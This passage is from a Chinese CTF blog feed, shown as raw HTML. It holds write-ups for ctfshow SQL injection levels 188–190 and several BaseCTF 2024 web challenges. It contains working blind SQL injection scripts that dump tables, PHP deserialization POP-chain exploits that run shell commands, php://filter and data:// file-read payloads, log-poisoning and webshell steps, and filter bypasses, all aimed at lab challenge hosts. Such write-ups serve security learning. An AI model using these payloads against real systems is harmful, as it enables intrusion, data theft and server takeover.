if(preg_match(&#x27;/and|or|select|from|where|union|join|sleep|benchmark|,|\(|\)|\&#x27;|\&quot;/i&#x27;, $username))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //密码检测</span><br><span class="line"> if(!is_numeric($password))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //密码判断</span><br><span class="line"> if($row[&#x27;pass&#x27;]==intval($password))&#123;</span><br><span class="line">     $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">     array_push($ret[&#x27;data&#x27;], array(&#x27;flag&#x27;=&gt;$flag));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>多了检测;</p><p>sql里，数字和字符串的匹配是弱类型比较，字符串会转换为数字，如0&#x3D;&#x3D;admin，那么如果输入的username是0，则会匹配所有开头不是数字或者为0的字符串和数字0。</p><p>然后再来看password的判断，也是弱类型的比较，那么也直接输入0，尝试登录一个用户名和pass的开头是字母或是0的用户。</p><h3 id="189"><a href="#189" class="headerlink" title="189:"></a>189:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//用户名检测</span><br><span class="line"> if(preg_match(&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;, $username))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //密码检测</span><br><span class="line"> if(!is_numeric($password))&#123;</span><br><span class="line">   $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br><span class="line">   die(json_encode($ret));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> //密码判断</span><br><span class="line"> if($row[&#x27;pass&#x27;]==$password)&#123;</span><br><span class="line">     $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>然后提示flag在api&#x2F;index.php文件中，这个是要是有load_file的函数</p><p>然后测试：u&#x3D;0&amp;p&#x3D;0时是密码错误说明存在u&#x3D;1这个账号，而u&#x3D;1&amp;p&#x3D;0时，查询失败说明没有这个账号</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># @Author:Kradress</span><br><span class="line">from operator import concat</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &#x27;http://45b25a84-ef41-400e-ad2f-ae90d1670eaa.challenge.ctf.show/api/index.php&#x27;</span><br><span class="line">uuid = string.digits+string.ascii_lowercase+&quot;-&#125;&quot;</span><br><span class="line">passwd = &quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;ctfshow&#123;&quot; #ctfshow&#123;</span><br><span class="line">flag = &#x27;ctfshow&#123;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(40):</span><br><span class="line">    for char in uuid:</span><br><span class="line">        print(char)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27; : passwd + f&quot;&#123;char&#125;&#x27;),0,1)&quot;,</span><br><span class="line">            &#x27;password&#x27; : 0</span><br><span class="line">        &#125;</span><br><span class="line">        res = requests.post(url, data=data)</span><br><span class="line">        if &quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in res.text:</span><br><span class="line">            passwd += char</span><br><span class="line">            print(passwd)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure><p>然后这个和183那个差不多，就是条件就是在路径里面查询</p><h3 id="190："><a href="#190：" class="headerlink" title="190："></a>190：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//密码检测</span><br><span class="line">if(!is_numeric($password))&#123;</span><br><span class="line">  $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br><span class="line">  die(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//密码判断</span><br><span class="line">if($row[&#x27;pass&#x27;]==$password)&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">//TODO:感觉少了个啥，奇怪</span><br></pre></td></tr></table></figure><p>这个试了试，发现使用u&#x3D;admin和p&#x3D;0时是密码错误 然后输入其他的还是有用户不存在的回显，应该是布尔盲注</p><p>然后就是用脚本跑库名，跑表名，跑列名，找到f1ag，然后猜flag</p><p>脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url = &quot;http://742f0ab8-2de1-4a7e-b0ff-0b33d00fd19f.challenge.ctf.show/api/index.php&quot;</span><br><span class="line">out = &#x27;&#x27;</span><br><span class="line">for j in range(1, 50):</span><br><span class="line">    print(j)</span><br><span class="line">    for k in range(32, 128):</span><br><span class="line">        # 猜解数据库名</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr(database(),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line"></span><br><span class="line">        # 猜解表名</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line"></span><br><span class="line">        # 猜解列名</span><br><span class="line">        # data=&#123;</span><br><span class="line">        #     &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">        #     &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        # &#125;</span><br><span class="line"></span><br><span class="line">        # 猜解 flag</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: f&quot;0&#x27;||if(ascii(substr((select f1ag from ctfshow_fl0g),&#123;j&#125;,1))=&#123;k&#125;,1,0)#&quot;,</span><br><span class="line">            &#x27;password&#x27;: &#x27;1&#x27;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        re = requests.post(url, data=data)</span><br><span class="line">        if (&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot; in re.text):</span><br><span class="line">            out += chr(k)</span><br><span class="line">            print(out)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>basectf2024web部分wp</title>
      <link href="/2025/03/18/basectf2024web%E9%83%A8%E5%88%86wp/"/>
      <url>/2025/03/18/basectf2024web%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h2 id="basectf2024web部分wp"><a href="#basectf2024web部分wp" class="headerlink" title="basectf2024web部分wp"></a>basectf2024web部分wp</h2><h3 id="A-Dark-Room："><a href="#A-Dark-Room：" class="headerlink" title="A Dark Room："></a>A Dark Room：</h3><p>源码；</p><h3 id="Aura-酱的礼物："><a href="#Aura-酱的礼物：" class="headerlink" title="Aura 酱的礼物："></a>Aura 酱的礼物：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); // Aura 酱，欢迎回家~ // 这里有一份礼物，请你签收一下哟~ $pen = $_POST[&#x27;pen&#x27;]; if (file_get_contents($pen) !== &#x27;Aura&#x27;) &#123;   die(&#x27;这是 Aura 的礼物，你不是 Aura！&#x27;); &#125; // 礼物收到啦，接下来要去博客里面写下感想哦~ $challenge = $_POST[&#x27;challenge&#x27;]; if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0) &#123;   die(&#x27;这不是 Aura 的博客！&#x27;); &#125; $blog_content = file_get_contents($challenge); if (strpos($blog_content, &#x27;已经收到Kengwang的礼物啦&#x27;) === false) &#123;   die(&#x27;请去博客里面写下感想哦~&#x27;); &#125; // 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ $gift = $_POST[&#x27;gift&#x27;]; include($gift); </span><br></pre></td></tr></table></figure><h4 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h4><p>if (file_get_contents($pen) !&#x3D;&#x3D; ‘Aura’) {   die(‘这是 Aura 的礼物，你不是 Aura！’); }  使用data伪协议</p><p>pen&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QXVyYQ&#x3D;&#x3D;</p><h4 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$challenge = $_POST[&#x27;challenge&#x27;]; if (strpos($challenge, &#x27;http://jasmineaura.github.io&#x27;) !== 0) &#123;   die(&#x27;这不是 Aura 的博客！&#x27;); &#125; </span><br></pre></td></tr></table></figure><p>ssrf的题，进行@截断</p><h4 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (strpos($blog_content, &#x27;已经收到Kengwang的礼物啦&#x27;) === false) &#123;   die(&#x27;请去博客里面写下感想哦~&#x27;); &#125; // 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~ $gift = $_POST[&#x27;gift&#x27;]; include($gift); </span><br></pre></td></tr></table></figure><p>使用filter协议读取源代码</p><p>gift&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>然后base64解密就行了</p><h3 id="ez-ser："><a href="#ez-ser：" class="headerlink" title="ez_ser："></a>ez_ser：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); class re&#123;   public $chu0;   public function __toString()&#123;     if(!isset($this-&gt;chu0))&#123;       return &quot;I can not believes!&quot;;     &#125;     $this-&gt;chu0-&gt;$nononono;   &#125; &#125; class web &#123;   public $kw;   public $dt;   public function __wakeup() &#123;     echo &quot;lalalla&quot;.$this-&gt;kw;   &#125;   public function __destruct() &#123;     echo &quot;ALL Done!&quot;;   &#125; &#125; class pwn &#123;   public $dusk;   public $over;   public function __get($name) &#123;     if($this-&gt;dusk != &quot;gods&quot;)&#123;       echo &quot;什么，你竟敢不认可?&quot;;     &#125;     $this-&gt;over-&gt;getflag();   &#125; &#125; class Misc &#123;   public $nothing;   public $flag;   public function getflag() &#123;     eval(&quot;system(&#x27;cat /flag&#x27;);&quot;);   &#125; &#125; class Crypto &#123;   public function __wakeup() &#123;     echo &quot;happy happy happy!&quot;;   &#125;   public function getflag() &#123;     echo &quot;you are over!&quot;;   &#125; &#125; $ser = $_GET[&#x27;ser&#x27;]; unserialize($ser); ?&gt; </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class re&#123;</span><br><span class="line">    public $chu0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class web &#123;</span><br><span class="line">    public $kw;</span><br><span class="line">    public $dt;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class pwn &#123;</span><br><span class="line">    public $dusk;</span><br><span class="line">    public $over;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Misc &#123;</span><br><span class="line">    public $nothing;</span><br><span class="line">    public $flag;</span><br><span class="line">&#125;</span><br><span class="line">$a = new web();</span><br><span class="line">$b = new re();</span><br><span class="line">$c = new pwn();</span><br><span class="line">$d = new Misc();</span><br><span class="line">$a -&gt; kw = $b;</span><br><span class="line">$b -&gt; chu0 = $c;</span><br><span class="line">$c -&gt; dusk = &#x27;gods&#x27;;</span><br><span class="line">$c -&gt; over = $d;</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>直接出来了；</p><h3 id="md5绕过欸："><a href="#md5绕过欸：" class="headerlink" title="md5绕过欸："></a>md5绕过欸：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);error_reporting(0);require &#x27;flag.php&#x27;;if (isset($_GET[&#x27;name&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;]) &amp;&amp; isset($_GET[&#x27;name2&#x27;]) &amp;&amp; isset($_POST[&#x27;password2&#x27;]) )&#123;  $name = $_GET[&#x27;name&#x27;];  $name2 = $_GET[&#x27;name2&#x27;];  $password = $_POST[&#x27;password&#x27;];  $password2 = $_POST[&#x27;password2&#x27;];  if ($name != $password &amp;&amp; md5($name) == md5($password))&#123;    if ($name2 !== $password2 &amp;&amp; md5($name2) === md5($password2))&#123;      echo $flag;    &#125;    else&#123;      echo &quot;再看看啊，马上绕过嘞！&quot;;    &#125;  &#125;  else &#123;    echo &quot;错啦错啦&quot;;  &#125;&#125;else &#123;  echo &#x27;没看到参数呐&#x27;;&#125;</span><br></pre></td></tr></table></figure><p>一个弱比较一个强比较</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?name=QNKCDZO&amp;name2[]=1</span><br><span class="line">password=240610708&amp;password2[]=2</span><br></pre></td></tr></table></figure><h3 id="flag直接读取不就行了？："><a href="#flag直接读取不就行了？：" class="headerlink" title="flag直接读取不就行了？："></a>flag直接读取不就行了？：</h3><p>学会了新东西：</p><p>K&#x3D;DirectoryIterator&amp;W&#x3D;&#x2F;secret&#x2F;</p><p>这个意思是调用DirectoryIterator这个函数进行遍历secret这个文件夹</p><p>SplFileObject：<code>SplFileObject</code> 提供了面向对象的方式来读取、写入和操作文件</p><p>然后伪协议读取就行了：J&#x3D;SplFileObject&amp;H&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;secret&#x2F;f11444g.php</p><h3 id="一起吃豆豆："><a href="#一起吃豆豆：" class="headerlink" title="一起吃豆豆："></a>一起吃豆豆：</h3><p>根据提示查看前端js，发现有base64密码，直接解密出来</p><h3 id="喵喵喵´•ﻌ•"><a href="#喵喵喵´•ﻌ•" class="headerlink" title="喵喵喵´•ﻌ•&#96;:"></a>喵喵喵´•ﻌ•&#96;:</h3><p>小小RCE 直接system(cat &#x2F;flag);</p><h3 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音:"></a>你听不到我的声音:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell_exec($_POST[&#x27;cmd&#x27;]);</span><br></pre></td></tr></table></figure><p>这个是不会回显的，然后需要用其他方式进行外带比如重定向</p><p>cmd&#x3D;cat &#x2F;flag&gt;1.txt</p><h3 id="upload："><a href="#upload：" class="headerlink" title="upload："></a>upload：</h3><p>直接传小🐎就行了，然后蚁剑连接就行了 Ez</p><h3 id="RCEisamazingwithspace"><a href="#RCEisamazingwithspace" class="headerlink" title="RCEisamazingwithspace:"></a>RCEisamazingwithspace:</h3><p>空格绕过。简单：cmd&#x3D;tac${IFS}&#x2F;flag</p><h3 id="Really-EZ-POP"><a href="#Really-EZ-POP" class="headerlink" title="Really EZ POP :"></a>Really EZ POP :</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); class Sink &#123;   private $cmd = &#x27;echo 123;&#x27;;   public function __toString()   &#123;     eval($this-&gt;cmd);   &#125; &#125; class Shark &#123;   private $word = &#x27;Hello, World!&#x27;;   public function __invoke()   &#123;     echo &#x27;Shark says:&#x27; . $this-&gt;word;   &#125; &#125; class Sea &#123;   public $animal;   public function __get($name)   &#123;     $sea_ani = $this-&gt;animal;     echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();   &#125; &#125; class Nature &#123;   public $sea;   public function __destruct()   &#123;     echo $this-&gt;sea-&gt;see;   &#125; &#125; if ($_POST[&#x27;nature&#x27;]) &#123;   $nature = unserialize($_POST[&#x27;nature&#x27;]); &#125; </span><br></pre></td></tr></table></figure><p>这个知道怎么来的。又学了一招：<code>Setword</code> 方法用于设定 <code>$word</code> 属性的值</p><h4 id="法1："><a href="#法1：" class="headerlink" title="法1："></a>法1：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &#x27;system(&quot;ls&quot;);&#x27;;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word = &#x27;Hello, World!&#x27;;</span><br><span class="line">    public function Setword($setword)&#123;</span><br><span class="line">        $this-&gt;word =$setword;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;Shark says:&#x27; . $this-&gt;word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $sea_ani = $this-&gt;animal;</span><br><span class="line">        echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sea-&gt;see;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Nature();</span><br><span class="line">$a-&gt;sea=new Sea();</span><br><span class="line">$a-&gt;sea-&gt;animal=new Shark();</span><br><span class="line">$a-&gt;sea-&gt;animal-&gt;Setword(new Sink());</span><br><span class="line">echo urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h4 id="法2："><a href="#法2：" class="headerlink" title="法2："></a>法2：</h4><p>通过使用 PHP 的反射机制访问和修改类的私有属性：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &#x27;system(&quot;tac /flag&quot;);&#x27;;</span><br><span class="line">    public function __toString() // 当对象被当做字符串时自动调用（找echo $this-&gt;a这种、strtolower()等）</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;cmd);  // 1 system(&quot;ls&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word;</span><br><span class="line">    public function __invoke()  // 对象被当做函数进行调用时触发（找有括号的类似$a()这种）</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;Shark says: &#x27; . $this-&gt;word;  // 2 Sink</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">    public function __get($name)  // 调用类中不存在变量时触发（找有连续箭头的 this-&gt;a-&gt;b）</span><br><span class="line">    &#123;</span><br><span class="line">        $sea_ani = $this-&gt;animal;</span><br><span class="line">        echo &#x27;In a deep deep sea, there is a &#x27; . $sea_ani();  // 3 Shark</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __destruct()  // 对象被销毁时自动触发，也就是我们的链头了</span><br><span class="line">    &#123;</span><br><span class="line">        echo $this-&gt;sea-&gt;see;  // 4 Sea</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 按照 1 2 3 4 的顺序编写 exp</span><br><span class="line">$s1 = new Sink();</span><br><span class="line">$s2 = new Shark();</span><br><span class="line"></span><br><span class="line">$reflection = new ReflectionClass($s2);</span><br><span class="line">$property = $reflection-&gt;getProperty(&#x27;word&#x27;);</span><br><span class="line">$property-&gt;setAccessible(true);</span><br><span class="line">$property-&gt;setValue($s2, $s1);</span><br><span class="line"></span><br><span class="line">$s3 = new Sea();</span><br><span class="line">$s3-&gt;animal = $s2;</span><br><span class="line">$n = new Nature();</span><br><span class="line">$n-&gt;sea = $s3;</span><br><span class="line"></span><br><span class="line">echo urlencode(serialize($n));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="法3："><a href="#法3：" class="headerlink" title="法3："></a>法3：</h4><p>通过构造__construct()魔术方法访问 类CLASS</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Sink</span><br><span class="line">&#123;</span><br><span class="line">    private $cmd = &#x27;system(&quot;cat /flag&quot;);&#x27;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Shark</span><br><span class="line">&#123;</span><br><span class="line">    private $word = &#x27;Hello, World!&#x27;;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;word = new Sink();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Sea</span><br><span class="line">&#123;</span><br><span class="line">    public $animal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Nature</span><br><span class="line">&#123;</span><br><span class="line">    public $sea;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = new Nature();</span><br><span class="line">$b = new Sea();</span><br><span class="line">$c = new Shark();</span><br><span class="line">$a -&gt; sea =$b;</span><br><span class="line">$b -&gt; animal = $c;</span><br><span class="line">$str = serialize($a);</span><br><span class="line">echo $str;?&gt;</span><br></pre></td></tr></table></figure><h3 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停:"></a>滤个不停:</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php highlight_file(__FILE__); error_reporting(0); $incompetent = $_POST[&#x27;incompetent&#x27;]; $Datch = $_POST[&#x27;Datch&#x27;]; if ($incompetent !== &#x27;HelloWorld&#x27;) &#123;   die(&#x27;写出程序员的第一行问候吧！&#x27;); &#125; //这是个什么东东？？？ $required_chars = [&#x27;s&#x27;, &#x27;e&#x27;, &#x27;v&#x27;, &#x27;a&#x27;, &#x27;n&#x27;, &#x27;x&#x27;, &#x27;r&#x27;, &#x27;o&#x27;]; $is_valid = true; foreach ($required_chars as $char) &#123;   if (strpos($Datch, $char) === false) &#123;     $is_valid = false;     break;   &#125; &#125; if ($is_valid) &#123;   $invalid_patterns = [&#x27;php://&#x27;, &#x27;http://&#x27;, &#x27;https://&#x27;, &#x27;ftp://&#x27;, &#x27;file://&#x27; , &#x27;data://&#x27;, &#x27;gopher://&#x27;];   foreach ($invalid_patterns as $pattern) &#123;     if (stripos($Datch, $pattern) !== false) &#123;       die(&#x27;此路不通换条路试试?&#x27;);     &#125;   &#125;    include($Datch); &#125; else &#123;   die(&#x27;文件名不合规 请重试&#x27;); &#125; ?&gt;</span><br></pre></td></tr></table></figure><p>这个先看看incompetent&#x3D;HelloWorld这个。然后再分析代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$required_chars = [&#x27;s&#x27;, &#x27;e&#x27;, &#x27;v&#x27;, &#x27;a&#x27;, &#x27;n&#x27;, &#x27;x&#x27;, &#x27;r&#x27;, &#x27;o&#x27;]; $is_valid = true; foreach ($required_chars as $char) &#123;   if (strpos($Datch, $char) === false) &#123;     $is_valid = false;     break;   &#125; &#125; if ($is_valid) &#123;   $invalid_patterns = [&#x27;php://&#x27;, &#x27;http://&#x27;, &#x27;https://&#x27;, &#x27;ftp://&#x27;, &#x27;file://&#x27; , &#x27;data://&#x27;, &#x27;gopher://&#x27;];   foreach ($invalid_patterns as $pattern) &#123;     if (stripos($Datch, $pattern) !== false) &#123;       die(&#x27;此路不通换条路试试?&#x27;);     &#125;   &#125;    include($Datch); </span><br></pre></td></tr></table></figure><p>让Datch里面存在’s’, ‘e’, ‘v’, ‘a’, ‘n’, ‘x’, ‘r’, ‘o’，然后过滤了一些伪协议，但是存在include,可以想想日志注入，哎，正好有&#x2F;var,什么的</p><p>Datch&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log  在UA头注入，然后rce就行了，或者蚁剑连接；</p><h3 id="ez-php-jail："><a href="#ez-php-jail：" class="headerlink" title="ez_php_jail："></a>ez_php_jail：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;hint.html&quot;);</span><br><span class="line">$Jail = $_GET[&#x27;Jail_by.Happy&#x27;];</span><br><span class="line"></span><br><span class="line">if($Jail == null) die(&quot;Do You Like My Jail?&quot;);</span><br><span class="line"></span><br><span class="line">function Like_Jail($var) &#123;</span><br><span class="line">    if (preg_match(&#x27;/(`|\$|a|c|s|require|include)/i&#x27;, $var)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Like_Jail($Jail)) &#123;</span><br><span class="line">    eval($Jail);</span><br><span class="line">    echo &quot;Yes! you escaped from the jail! LOL!&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;You will Jail in your life!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">// 在HTML解析后再输出PHP源代码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这个本来我是直接传的，发现使用一些其他的RCE手段都传不上去，然后看了看wp，知道了一个知识点：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当 php 版本⼩于 8 时，GET 请求的参数名含有 . ，会被转为 _ ，但是如果参数名中有 [ ，这</span><br><span class="line">个 [ 会被直接转为 _ ，但是后⾯如果有 . ，这个 . 就不会被转为 _ 。</span><br></pre></td></tr></table></figure><p>于是</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?Jail[by.Happy=highlight_file(glob(&quot;/f*&quot;)[0]);</span><br></pre></td></tr></table></figure><p>解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">glob 是 PHP 中的一个函数，它的作用是按照指定的模式来查找文件路径名glob 是 PHP 中的一个函数，它的作用是按照指定的模式来查找文件路径名</span><br><span class="line">glob(&quot;/f*&quot;)[0]：</span><br><span class="line">这是对 glob(&quot;/f*&quot;) 返回的数组进行索引操作，选取数组里的第一个元素，也就是根目录下文件名以 f 开头的第一个文件的路径。</span><br></pre></td></tr></table></figure><h3 id="HTTP-是什么呀："><a href="#HTTP-是什么呀：" class="headerlink" title="HTTP 是什么呀："></a>HTTP 是什么呀：</h3><p>一步步来就ok</p><h3 id="1z-php："><a href="#1z-php：" class="headerlink" title="1z_php："></a>1z_php：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment"># 我记得她...好像叫flag.php吧？</span></span><br><span class="line"><span class="variable">$emp</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;e_m.p&#x27;</span>];</span><br><span class="line"><span class="variable">$try</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;try&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$emp</span>!=<span class="string">&quot;114514&quot;</span>&amp;&amp;<span class="title function_ invoke__">intval</span>(<span class="variable">$emp</span>,<span class="number">0</span>)===<span class="number">114514</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$emp</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$emp</span>[<span class="variable">$i</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你不是hacker？那请去外场等候！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;只有真正的hacker才能拿到flag！&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?HACKER/is&#x27;</span>,<span class="variable">$try</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;你是hacker还敢自报家门呢？&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ 